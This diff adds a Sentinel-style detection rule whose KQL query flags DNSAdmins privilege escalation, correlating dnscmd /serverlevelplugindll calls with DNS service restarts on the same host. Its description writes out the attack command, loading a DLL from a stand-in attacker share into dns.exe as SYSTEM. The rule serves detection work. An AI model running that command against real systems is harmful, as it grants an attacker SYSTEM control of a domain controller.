@@ -1,0 +1,96 @@
+id: a1b2c3d4-0016-4a5b-8c9d-dns016dnsadmin
+name: DNSAdmins Privilege Escalation via DLL Injection (dnscmd /serverlevelplugindll)
+description: |
+  Community rule by David Alonso (https://github.com/davidalonsod/Dalonso-Security-Repo). Licensed under The Unlicense.
+
+  Detects the DNSAdmins Active Directory privilege escalation technique where
+  a member of the DNSAdmins group registers a malicious DLL to be loaded into
+  dns.exe (which runs as SYSTEM) using:
+    dnscmd.exe /config /serverlevelplugindll \\attacker\share\evil.dll
+  The attack requires a subsequent DNS service restart to load the DLL, at
+  which point the payload executes as NT AUTHORITY\SYSTEM on the DNS server
+  (typically a Domain Controller).
+  This technique was publicly documented by Shay Ber in 2017 and has been
+  used in real-world attacks. Any account in DNSAdmins — even a low-privilege
+  domain account — can execute this technique without Domain Admin rights.
+  Key signals detected by this rule:
+    1. dnscmd.exe executed with /serverlevelplugindll in the command line
+    2. DNS service stop/restart within 60 minutes on the same host
+  Both conditions must match on the same Computer within the time window.
+  MITRE T1574.002 (Hijack Execution Flow: DLL Side-Loading via DNS service)
+  MITRE T1078.002 (Domain Accounts — DNSAdmins group membership)
+  Ref: Shay Ber "Abusing DNSAdmins privilege for escalation in Active Directory"
+severity: High
+requiredDataConnectors:
+- connectorId: SecurityEvents
+  dataTypes:
+  - SecurityEvent
+queryFrequency: PT1H
+queryPeriod: PT1H
+triggerOperator: gt
+triggerThreshold: 0
+enabled: true
+tactics:
+- PrivilegeEscalation
+- Persistence
+relevantTechniques:
+- T1078.002
+- T1574.002
+query: |
+  // Step 1: Detect dnscmd.exe invoked with /serverlevelplugindll
+  // (registers arbitrary DLL to be loaded by dns.exe at SYSTEM privilege)
+  let DnscmdAbuse =
+      SecurityEvent
+      | where TimeGenerated > ago(1h)
+      | where EventID == 4688  // Process Creation (requires audit policy)
+      | where NewProcessName has "dnscmd.exe"
+      | where CommandLine has "serverlevelplugindll"
+      | project
+          DnscmdTime   = TimeGenerated,
+          Computer,
+          SubjectAccount = SubjectUserName,
+          CommandLine;
+  // Step 2: Detect DNS service restart following the dnscmd call
+  // Restart is required to load the DLL — without it the attack is incomplete
+  let DnsServiceRestart =
+      SecurityEvent
+      | where TimeGenerated > ago(1h)
+      | where EventID == 7036 or EventID == 4697
+      | where Activity has "DNS" or ServiceName contains "DNS"
+      | project
+          RestartTime   = TimeGenerated,
+          Computer,
+          ServiceEvent  = Activity;
+  // Correlate: same Computer, restart within 60 min of dnscmd
+  DnscmdAbuse
+  | join kind=inner DnsServiceRestart on Computer
+  | where abs(datetime_diff("minute", DnscmdTime, RestartTime)) < 60
+  | project
+      DnscmdTime,
+      Computer,
+      SubjectAccount,
+      CommandLine,
+      RestartTime,
+      ServiceEvent
+entityMappings:
+- entityType: Host
+  fieldMappings:
+  - identifier: FullName
+    columnName: Computer
+- entityType: Account
+  fieldMappings:
+  - identifier: Name
+    columnName: SubjectAccount
+alertDetailsOverride:
+  alertDisplayNameFormat: 'DNSAdmins DLL Injection — {{SubjectAccount}} on {{Computer}} registered malicious DLL'
+  alertDescriptionFormat: 'User {{SubjectAccount}} on {{Computer}} executed dnscmd /serverlevelplugindll (command: ''{{CommandLine}}''). DNS service restart detected within 60 minutes — malicious DLL may
+    have been loaded by dns.exe at SYSTEM privilege level.'
+customDetails:
+  CommandLine: CommandLine
+  ServiceEvent: ServiceEvent
+version: 1.0.0
+kind: Scheduled
+tags:
+- Community
+- David Alonso
+- Threat Hunting
